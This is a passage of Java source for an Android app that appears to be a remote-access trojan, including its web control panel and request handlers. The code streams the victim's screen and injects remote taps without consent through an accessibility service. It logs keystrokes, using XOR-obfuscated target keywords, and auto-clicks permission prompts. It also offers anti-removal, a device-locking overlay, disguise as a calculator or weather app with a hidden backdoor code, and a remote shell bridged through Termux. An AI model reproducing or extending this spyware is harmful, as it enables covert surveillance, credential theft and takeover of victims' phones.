        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Suppresses hardware backlight for physical stealth. Remote C2 feed remains visible.</p>");
        html.append("<div style=\"display:flex; gap:10px;\">");
        html.append("<button onclick=\"ghostAction('blackout_on')\" class=\"btn btn-small\" style=\"border-color: #fff; color: #fff; margin:0;\">ACTIVATE</button>");
        html.append("<button onclick=\"ghostAction('blackout_off')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin:0;\">RESTORE</button>");
        html.append("</div></div>");

        // System Denial Lock
        html.append("<div class=\"info-item\">");
        html.append("<div class=\"info-label\">SYSTEM_DENIAL_LOCK</div>");
        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Deploys a persistent, full-screen security overlay. Effectively locks the physical device.</p>");
        html.append("<div style=\"display:flex; gap:10px;\">");
        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); margin:0;\">DEPLOY_LOCK</button>");
        html.append("</div></div>");

        // Self Healing & Automation
        html.append("<div class=\"info-item\">");
        html.append("<div class=\"info-label\">SELF_HEALING</div>");
        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Forces open system permissions or automatically grants requested prompts.</p>");
        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px;\">");
        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE</button>");
        html.append("<button onclick=\"ghostAction('autogrant')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">AUTO_GRANT</button>");
        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"margin:0;\">LOADING...</button>");
        html.append("</div></div>");
        
        html.append("</div></div>");

        // Ghost Remote Control Section
        html.append("<div class=\"info-section\">");
        html.append("<h3 style=\"font-size: 0.95rem; display: flex; align-items: center; gap: 8px;\">&#128433; Ghost_Remote_Control</h3>");
        html.append("<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 20px;\">Real-time interaction using Accessibility Triangulation (No consent prompt required).</p>");
        
        // Screen View tool
        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
        html.append("<div class=\"phone-frame\">");
        html.append("<div class=\"phone-notch\"></div>");
        html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
        html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px;\">OLED_STANDBY</div>");
        html.append("</div></div></div>");

        // System Gestures right below the screen
        html.append("<div style=\"display:flex; justify-content:center; gap:5px; margin-bottom:20px;\">");
        html.append("<button onclick=\"ghostAction('recents')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 12px; border-color: #9b59b6; color: #9b59b6; flex:1; max-width:110px; padding: 10px 5px;\">RECENTS</button>");
        html.append("<button onclick=\"ghostAction('home')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 12px; flex:1; max-width:110px; padding: 10px 5px;\">HOME</button>");
        html.append("<button onclick=\"ghostAction('back')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 12px; border-color: #f39c12; color: #f39c12; flex:1; max-width:110px; padding: 10px 5px;\">BACK</button>");
        html.append("</div>");

        // Toggle Initiate/Terminate button
        html.append("<div style=\"display:flex; justify-content:center; margin-bottom:30px;\">");
        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"width:100%; max-width:300px; border-radius:12px; margin: 0 auto;\">INITIATE_VIEW</button>");
        html.append("</div>");

        html.append("<div class=\"info-grid\">");
        
        // Removed duplicate SYSTEM_GESTURES and UPLINK_PROTOCOL sections

        html.append("</div>");

        // Stealth Operations Section (Moved Down)
        html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
        html.append("<h2 style=\"color: var(--neon-orange); font-size: 0.95rem;\">STEALTH_OPERATIONS</h2>");
        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. Choose an identity from the library. Each identity includes a <b>fully functional decoy interface</b>. Use dial pad code <b>*#1337#</b> or find the hidden 10-tap backdoor to restore access.</p>");
        
        html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: center;\">");
        html.append("<label class=\"info-label\" style=\"align-self: center;\">MASQUERADE_IDENTITY:</label>");
        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
        html.append("<option value=\"update\">System Update (Status Gear)</option>");
        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
        html.append("<option value=\"settings\">Settings (System Config)</option>");
        html.append("</select>");
        html.append("</div>");

        html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: center;\">");
        html.append("<button onclick=\"toggleStealth()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); border-radius:12px; padding: 10px 25px;\">INITIATE_STEALTH</button>");
        html.append("<button onclick=\"restoreNormal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius:12px; padding: 10px 25px;\">RESTORE_NORMAL</button>");
        html.append("</div>");
        html.append("</div>");

        // Ghost Keylogs Section (Renamed)
        html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
        html.append("<div class=\"flex-header\">");
        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 0.85rem; display: flex; align-items: center; gap: 8px;\">&#9000; Ghost_Keylogs</h2>");
        html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
        html.append("</div>");
        html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom:15px;\">Real-time interception of keystrokes and system text.</p>");
        
        html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:300px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("[WAITING_FOR_UPLINK] Monitoring focused app input...");
        html.append("</div>");
        html.append("</div>");
        
        html.append("<div style=\"height: 50px;\"></div>"); // Buffer

        html.append("<script>");
        html.append("var ghostScreenActive = false;");
        html.append("function startGhostScreen() {");
        html.append("  ghostScreenActive = true;");
        html.append("  const status = document.getElementById('ghost-screen-status');");
        html.append("  if (status) status.style.display = 'none';");
        html.append("  const toggleBtn = document.getElementById('ghost-toggle-btn');");
        html.append("  if (toggleBtn) { toggleBtn.innerText = 'TERMINATE'; toggleBtn.style.borderColor = 'var(--danger)'; toggleBtn.style.color = 'var(--danger)'; }");
        html.append("  document.getElementById('ghost-screen-status').innerHTML = 'CONNECTING...';");
        html.append("  const startBtn = document.getElementById('ghost-start-btn'); if(startBtn) startBtn.style.display = 'none';");
        html.append("  const stopBtn = document.getElementById('ghost-stop-btn'); if(stopBtn) stopBtn.style.display = 'inline-block';");
        html.append("  refreshGhostScreen();");
        html.append("}");
        html.append("function stopGhostScreen() {");
        html.append("  ghostScreenActive = false;");
        html.append("  const status = document.getElementById('ghost-screen-status');");
        html.append("  if (status) { status.style.display = 'block'; status.innerText = 'OLED_STANDBY'; }");
        html.append("  const toggleBtn = document.getElementById('ghost-toggle-btn');");
        html.append("  if (toggleBtn) { toggleBtn.innerText = 'INITIATE_VIEW'; toggleBtn.style.borderColor = 'var(--neon-green)'; toggleBtn.style.color = 'var(--neon-green)'; }");
        html.append("  document.getElementById('ghost-screen-status').innerHTML = 'COVERT_FEED_STANDBY';");
        html.append("  document.getElementById('ghost-screen-status').style.display = 'block';");
        html.append("  document.getElementById('ghost-screen-stream').src = '';");
        html.append("  const startBtn = document.getElementById('ghost-start-btn'); if(startBtn) startBtn.style.display = 'inline-block';");
        html.append("  const stopBtn = document.getElementById('ghost-stop-btn'); if(stopBtn) stopBtn.style.display = 'none';");
        html.append("}");
        html.append("function toggleGhostScreen() {");
        html.append("  if (ghostScreenActive) stopGhostScreen(); else startGhostScreen();");
        html.append("}");
        html.append("function refreshGhostScreen() {");
        html.append("  if (!ghostScreenActive) return;");
        html.append("  const img = document.getElementById('ghost-screen-stream');");
        html.append("  const status = document.getElementById('ghost-screen-status');");
        
        // --- DOUBLE BUFFERING PROTOCOL ---
        // Create an off-screen buffer to load the next frame
        // This prevents the "flashing" or white flicker between frames.
        html.append("  const buffer = new Image();");
        html.append("  buffer.src = '/ghost/screenshot?t=' + Date.now();");
        
        html.append("  buffer.onload = () => {");
        html.append("    if (!ghostScreenActive) return;");
        html.append("    img.src = buffer.src;"); // Instant swap from memory
        html.append("    if (status) status.style.display = 'none';");
        html.append("    setTimeout(refreshGhostScreen, 200);");
        html.append("  };");
        
        html.append("  buffer.onerror = () => {");
        html.append("    if (ghostScreenActive) setTimeout(refreshGhostScreen, 300);");
        html.append("  };");
        html.append("}");
        html.append("var ghostDragStart = null;");
        html.append("var lastInteractionTime = 0;");
        
        html.append("function startGhostDrag(e) {");
        html.append("  const img = document.getElementById('ghost-screen-stream');");
        html.append("  const rect = img.getBoundingClientRect();");
        html.append("  ghostDragStart = {");
        html.append("    x: ((e.clientX - rect.left) / rect.width) * 100,");
        html.append("    y: ((e.clientY - rect.top) / rect.height) * 100,");
        html.append("    t: Date.now()");
        html.append("  };");
        html.append("}");
        
        html.append("function endGhostDrag(e) {");
        html.append("  if (!ghostDragStart) return;");
        html.append("  const now = Date.now();");
        html.append("  if (now - lastInteractionTime < 150) return;");
        html.append("  lastInteractionTime = now;");

        html.append("  const img = document.getElementById('ghost-screen-stream');");
        html.append("  const rect = img.getBoundingClientRect();");
        html.append("  const endX = ((e.clientX - rect.left) / rect.width) * 100;");
        html.append("  const endY = ((e.clientY - rect.top) / rect.height) * 100;");
        html.append("  const duration = now - ghostDragStart.t;");
        html.append("  const dist = Math.sqrt(Math.pow(endX - ghostDragStart.x, 2) + Math.pow(endY - ghostDragStart.y, 2));");
        html.append("  if (dist < 2) {");
        html.append("    fetch('/ghost/interact?action=click&px=' + ghostDragStart.x + '&py=' + ghostDragStart.y);");
        html.append("  } else {");
        html.append("    fetch('/ghost/interact?action=swipe&px1=' + ghostDragStart.x + '&py1=' + ghostDragStart.y + '&px2=' + endX + '&py2=' + endY + '&d=' + Math.max(duration, 100));");
        html.append("  }");
        html.append("  ghostDragStart = null;");
        html.append("}");
        html.append("function openSettings() { fetch('/ghost/interact?action=settings'); }");
        html.append("function toggleLock() { if(confirm('Initiate System Lock? This will block the device display.')) fetch('/ghost/lock').then(() => checkGhostStatus()); }");
        html.append("function toggleStealth() {");
        html.append("  const type = document.getElementById('stealth-type').value;");
        html.append("  if(confirm('Initiate Stealth Protocol? This will change the app identity.')) {");
        html.append("    fetch('/stealth?type=' + type).then(r => r.json()).then(d => {");
        html.append("      alert(d.mode === 'stealth' ? 'STEALTH_ACTIVE: Identity replaced.' : 'STEALTH_DISENGAGED: Main icon restored.');");
        html.append("    });");
        html.append("  }");
        html.append("}");
        html.append("function restoreNormal() {");
        html.append("  if(confirm('Restore normal identity? This will re-enable the main System icon.')) {");
        html.append("    fetch('/stealth?action=restore').then(r => r.json()).then(d => {");
        html.append("      alert('STEALTH_DISENGAGED: Main icon restored.');");
        html.append("    });");
        html.append("  }");
        html.append("}");
        html.append("function ghostAction(a) { fetch('/ghost/interact?action='+a); }");
        html.append("function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }");
        html.append("async function refreshGhostLogs() {");
        html.append("  try {");
        html.append("    const r = await fetch('/ghost/keys');");
        html.append("    if (!r.ok) return;");
        html.append("    const data = await r.json();");
        html.append("    const term = document.getElementById('ghost-terminal');");
        html.append("    if(!term) return;");
        html.append("    if(data.keys.length > 0) {");
        html.append("      const isAtBottom = (term.scrollHeight - term.scrollTop) <= (term.clientHeight + 10);");
        html.append("      let esc = data.keys.join('').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');");
        html.append("      const _k = (s) => s.split('').map((c,i) => String.fromCharCode(c.charCodeAt(0) ^ 'SysAdmin'.charCodeAt(i % 8))).join('');");
        html.append("      const targets = [_k('\\x1C\\x0D\\x03'), _k('\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A'), _k('\\x0F\\x06\\x14\\x00\\x0A'), _k('\\x16\\x1A\\x16\\x13'), _k('\\x06\\x04\\x02\\x08\\x08')];");
        html.append("      targets.forEach(t => {");
        html.append("        const reg = new RegExp('(' + t + ')', 'gi');");
        html.append("        esc = esc.replace(reg, '<span style=\"color:var(--danger); font-weight:bold; text-shadow: 0 0 5px rgba(255,49,49,0.5);\">$1</span>');");
        html.append("      });");
        html.append("      term.innerHTML = esc;");
        html.append("      if (isAtBottom) { term.scrollTop = term.scrollHeight; }");
        html.append("    }");
        html.append("  } catch(e) {}");
        html.append("}");
        html.append("async function checkGhostStatus() {");
        html.append("  try {");
        html.append("    const r = await fetch('/ghost/status');");
        html.append("    if (!r.ok) return;");
        html.append("    const data = await r.json();");
        html.append("    const card = document.getElementById('ghost-status-card');");
        html.append("    const text = document.getElementById('ghost-status-text');");
        html.append("    const prompt = document.getElementById('accessibility-prompt');");
        html.append("    const arBtn = document.getElementById('anti-removal-btn');");
        html.append("    const lockBtn = document.getElementById('lock-btn');");
        html.append("    if (data.active) {");
        html.append("      card.style.borderColor = 'var(--neon-green)';");
        html.append("      text.innerHTML = '<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>';");
        html.append("      prompt.style.display = 'none';");
        html.append("    } else {");
        html.append("      card.style.borderColor = 'var(--danger)';");
        html.append("      text.innerHTML = '<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>';");
        html.append("      prompt.style.display = 'block';");
        html.append("    }");
        html.append("    if (lockBtn) {");
        html.append("      if (data.lock) {");
        html.append("        lockBtn.innerHTML = 'RELEASE_LOCK'; lockBtn.style.borderColor = 'var(--neon-green)'; lockBtn.style.color = 'var(--neon-green)';");
        html.append("      } else {");
        html.append("        lockBtn.innerHTML = 'DEPLOY_LOCK'; lockBtn.style.borderColor = 'var(--danger)'; lockBtn.style.color = 'var(--danger)';");
        html.append("      }");
        html.append("    }");
        html.append("    const stream = document.getElementById('ghost-screen-stream');");
        html.append("    if (stream) {");
        html.append("      if (data.blackout) {");
        html.append("        stream.style.filter = 'brightness(5) contrast(1.8) saturate(1.2) grayscale(0.2)';");
        html.append("      } else {");
        html.append("        stream.style.filter = 'none';");
        html.append("      }");
        html.append("    }");
        html.append("    if (arBtn) {");
        html.append("      if (data.antiRemoval) {");
        html.append("        arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: ON'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)';");
        html.append("      } else {");
        html.append("        arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: OFF'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)';");
        html.append("      }");
        html.append("    }");
        html.append("  } catch(e) {}");
        html.append("}");
        html.append("setInterval(checkGhostStatus, 2000);");
        html.append("setInterval(refreshGhostLogs, 2000);");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveKeystrokes() {
        org.json.JSONArray array = new org.json.JSONArray();
        for (String key : AccessibilityCore.getKeystrokes()) {
            array.put(key);
        }
        try {
            org.json.JSONObject obj = new org.json.JSONObject();
            obj.put("keys", array);
            return newFixedLengthResponse(Response.Status.OK, "application/json", obj.toString());
        } catch (Exception e) { return serveError(e.getMessage()); }
    }

    private Response performInteraction(Map<String, String> params) {
        String action = params.get("action");
        AccessibilityCore ghost = AccessibilityCore.getInstance();
        
        if (action == null) return serveError("No action");

        if (action.equals("settings")) {
            try {
                Intent intent = getIntent();
                context.startActivity(intent);
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
            } catch (Exception e) {
                Log.e("LabRATS", "Settings intent error: " + e.getMessage());
                // Absolute fallback to main menu
                Intent fallback = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(fallback);
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true, \"fallback\":true}");
            }
        }

        if (ghost == null) return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");

        // --- SECURITY LOCK CHECK ---
        if (AccessibilityCore.isLockActive() && !action.equals("lock") && !action.equals("settings")) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"SYSTEM_LOCK_ACTIVE\"}");
        }

        boolean success = false;
        switch (action) {
            case "click":
                if (params.containsKey("px") && params.containsKey("py")) {
                    float px = Float.parseFloat(params.get("px"));
                    float py = Float.parseFloat(params.get("py"));
                    int realX = (int) (px * ghost.getScreenWidth() / 100);
                    int realY = (int) (py * ghost.getScreenHeight() / 100);
                    success = ghost.clickAt(realX, realY);
                } else if (params.containsKey("x") && params.containsKey("y")) {
                    int x = Integer.parseInt(params.get("x"));
                    int y = Integer.parseInt(params.get("y"));
                    success = ghost.clickAt(x, y);
                } else if (params.containsKey("text")) {
                    success = ghost.clickByText(params.get("text"));
                }
                break;
            case "clickText":
                if (params.containsKey("text")) {
                    success = ghost.clickByText(params.get("text"));
                }
                break;
            case "clickId":
                if (params.containsKey("id")) {
                    success = ghost.clickById(params.get("id"));
                }
                break;
            case "swipe":
                if (params.containsKey("px1") && params.containsKey("py1") && params.containsKey("px2") && params.containsKey("py2")) {
                    float px1 = Float.parseFloat(params.get("px1"));
                    float py1 = Float.parseFloat(params.get("py1"));
                    float px2 = Float.parseFloat(params.get("px2"));
                    float py2 = Float.parseFloat(params.get("py2"));
                    int d = Integer.parseInt(params.get("d"));
                    int x1 = (int) (px1 * ghost.getScreenWidth() / 100);
                    int y1 = (int) (py1 * ghost.getScreenHeight() / 100);
                    int x2 = (int) (px2 * ghost.getScreenWidth() / 100);
                    int y2 = (int) (py2 * ghost.getScreenHeight() / 100);
                    success = ghost.swipe(x1, y1, x2, y2, d);
                }
                break;
            case "home":
                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "back":
                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "recents":
                    success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            case "blackout_on":
                ghost.startBlackout(true);
                success = true;
                break;
            case "blackout_off":
                ghost.startBlackout(false);
                success = true;
                break;
            case "autoheal":
                ghost.runAutoHeal();
                success = true;
                break;
            case "toggleAntiRemoval":
                AccessibilityCore.setAntiRemovalEnabled(!AccessibilityCore.isAntiRemovalEnabled());
                success = true;
                break;
            case "autogrant":
                success = ghost.clickByText("Allow") || 
                          ghost.clickByText("While using the app") || 
                          ghost.clickByText("Only this time") || 
                          ghost.clickByText("Allow all the time") ||
                          ghost.clickByText("GRANT") ||
                          ghost.clickByText("ALLOW");
                break;
        }

        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":" + success + "}");
    }

    @NonNull
    private Intent getIntent() {
        android.content.ComponentName componentName = new android.content.ComponentName(context, AccessibilityCore.class);
        String serviceId = componentName.flattenToString();
        
        // Use standard accessibility settings intent to avoid permission denials
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);

        // Fallback-style extras that work on some OEM versions to help navigation
        intent.putExtra(":settings:fragment_args_key", serviceId);
        android.os.Bundle bundle = new android.os.Bundle();
        bundle.putString(":settings:fragment_args_key", serviceId);
        intent.putExtra(":settings:show_fragment_args", bundle);

        return intent;
    }

    private void vibrateDevice() {
        android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(500);
            }
            logActivity("DEVICE_CONTROL: Triggered vibration sequence");
        }
    }

    private void setMaxVolume() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            int[] streams = {android.media.AudioManager.STREAM_RING, android.media.AudioManager.STREAM_MUSIC, 
                             android.media.AudioManager.STREAM_NOTIFICATION, android.media.AudioManager.STREAM_ALARM};
            for (int stream : streams) {
                am.setStreamVolume(stream, am.getStreamMaxVolume(stream), 0);
            }
            logActivity("DEVICE_CONTROL: System volume synchronized to MAXIMUM");
        }
    }

    private void setSilentMode() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
            logActivity("DEVICE_CONTROL: System entered SILENT mode");
        }
    }

    private void openUrlOnDevice(String url) {
        if (url == null || url.isEmpty()) return;
        try {
            if (!url.startsWith("http")) url = "http://" + url;
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
            logActivity("DEVICE_CONTROL: Forced open URL - " + url);
        } catch (Exception e) {
            logActivity("DEVICE_ERROR: Failed to open URL - " + e.getMessage());
        }
    }

    private void showToast(String msg) {
        if (msg == null || msg.isEmpty()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG).show();
            logActivity("DEVICE_CONTROL: System toast dispatched - " + msg);
        });
    }

    private Response serveAppList() {
        logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        html.append("<div class=\"card\"><h2>Installed Applications</h2>");
        
        android.content.pm.PackageManager pm = context.getPackageManager();
        List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
        
        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th></tr></thead><tbody>");
        for (android.content.pm.PackageInfo app : apps) {
            String name = app.applicationInfo.loadLabel(pm).toString();
            boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
            String typeLabel = isSystem ? "<span style=\"color:#888; font-size:0.6rem;\">SYSTEM</span>" : "<span style=\"color:var(--neon-green); font-size:0.6rem; font-weight:bold;\">USER</span>";
            
            html.append("<tr><td>").append(escapeHtml(name)).append("</td>");
            html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
            html.append("<td>").append(typeLabel).append("</td>");
            html.append("<td>").append(app.versionName).append("</td></tr>");
        }
        html.append("</tbody></table></div></div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private void selfDestruct() {
        logActivity("CRITICAL_MAINTENANCE: Initiating self-destruct sequence...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                // 1. Disable Admin if active to allow uninstall
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName component = new android.content.ComponentName(context, StabilityPolicy.class);
                if (dpm != null && dpm.isAdminActive(component)) {
                    dpm.removeActiveAdmin(component);
                }

                // 2. Trigger Uninstall
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e) {
                logActivity("SELF_DESTRUCT_ERROR: Sequence failed - " + e.getMessage());
            }
        }, 1000);
    }

    private static String currentShellPath = "/sdcard";

    private boolean isAppInstalled(String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private String executeShell(String command) {
        if (command == null || command.isEmpty()) return "";
        try {
            if (command.equalsIgnoreCase("help") || command.equalsIgnoreCase("-h")) {
                return "AVAILABLE_COMMANDS:\n\n" +
                       "  cd <path>        - Change working directory\n" +
                       "  ls [-la]         - List files in current directory\n" +
                       "  pwd              - Print current directory\n" +
                       "  cat <file>       - View file contents\n" +
                       "  rm <file>        - Remove file\n" +
                       "  mkdir <dir>      - Create directory\n" +
                       "  pm list packages - List installed app packages\n" +
                       "  getprop          - View system properties\n" +
                       "  df -h            - Disk usage summary\n" +
                       "  top -n 1         - Process list\n" +
                       "  netstat          - Network status\n" +
                       "  ip addr          - IP configuration\n" +
                       "  uptime           - System uptime\n" +
                       "  whoami           - Current user identity\n" +
                       "  id               - UID/GID info\n" +
                       "  uname -a         - Kernel version/info\n" +
                       "  logcat -d        - Dump system logs\n" +
                       "  sysinfo          - Aggregate system overview\n" +
                       "  termux <cmd>     - Route command through Termux bridge\n" +
                       "  termux-fix-mirrors - Fix 'No mirror selected' errors\n" +
                       "  help / -h        - Show this help menu\n\n" +
                       "CURRENT_PATH: " + currentShellPath;
            }

            if (command.equalsIgnoreCase("sysinfo")) {
                return "SYSTEM_OVERVIEW:\n" +
                       "  Manufacturer: " + android.os.Build.MANUFACTURER + "\n" +
                       "  Model: " + android.os.Build.MODEL + "\n" +
                       "  Android Ver: " + android.os.Build.VERSION.RELEASE + " (API " + android.os.Build.VERSION.SDK_INT + ")\n" +
                       "  C2 Uplink: " + currentShellPath + "\n" +
                       "  Session User: " + System.getProperty("user.name") + "\n" +
                       "  Architecture: " + System.getProperty("os.arch");
            }

            if (command.trim().equalsIgnoreCase("termux-fix-mirrors")) {
                return executeShell("termux echo \"deb https://packages-cf.termux.dev/apt/termux-main stable main\" > /data/data/com.termux/files/usr/etc/apt/sources.list && apt update");
            }

            if (command.startsWith("termux ") || 
               (isAppInstalled("com.termux") && (command.startsWith("pkg ") || command.startsWith("apt ") || command.startsWith("pip ") || command.startsWith("python ") || command.startsWith("nmap ") || command.startsWith("echo ")))) {
                
                if (!isAppInstalled("com.termux")) return "Error: Termux is not installed on this device.";
                
                String termuxCmd = command;
                if (command.startsWith("termux ")) termuxCmd = command.substring(7).trim();

                // Generate a unique filename for this specific execution to avoid permission/cache issues
                String cmdId = String.valueOf(System.currentTimeMillis() % 1000000);
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File outputFile = new File(downloadDir, "termux_" + cmdId + ".txt");

                Intent intent = new Intent("com.termux.RUN_COMMAND");
                intent.setClassName("com.termux", "com.termux.app.RunCommandService");
                intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash");
                
                // Optimized wrapper: Clean environment and explicit exit marker
                String wrappedCmd = "export PATH=/data/data/com.termux/files/usr/bin:$PATH; " +
                                  "export HOME=/data/data/com.termux/files/home; " +
                                  "export DEBIAN_FRONTEND=noninteractive; " +
                                  "({ " + termuxCmd + "; }) > " + outputFile.getAbsolutePath() + " 2>&1; " +
                                  "echo \"\n__DONE_" + cmdId + "__\" >> " + outputFile.getAbsolutePath();
                
                intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", new String[]{"-c", wrappedCmd});
                intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", "/data/data/com.termux/files/home");
                intent.putExtra("com.termux.RUN_COMMAND_BACKGROUND", true);
                intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
                
                try {
                    context.startService(intent);
                } catch (Exception e) {
                    return "Error starting bridge: " + e.getMessage();
                }

                // Poll for the unique completion marker
                int retries = 0;
                int maxRetries = (command.contains("pkg") || command.contains("apt") || command.contains("pip")) ? 300 : 60; 
                String marker = "__DONE_" + cmdId + "__";

                while (retries < maxRetries) { 
                    try { Thread.sleep(1000); } catch (Exception ignored) {}
                    
                    if (outputFile.exists() && outputFile.length() > 0) {
                        try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(outputFile, "r")) {
                            long len = raf.length();
                            if (len > 30) {
                                raf.seek(len - 30);
                                byte[] endBytes = new byte[30];
                                raf.read(endBytes);
                                if (new String(endBytes).contains(marker)) break;
                            }
                        } catch (Exception ignored) {}
                    }
                    retries++;
                }

                if (outputFile.exists() && outputFile.length() > 0) {
                    // Marker found, but wait for OS to flush and close file handles
                    try { Thread.sleep(2000); } catch (Exception ignored) {}
                    
                    for (int r = 0; r < 5; r++) { // More retries
                        try {
                            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                            try (java.io.FileInputStream fis = new java.io.FileInputStream(outputFile)) {
                                byte[] buffer_chunk = new byte[8192];
                                int len_read;
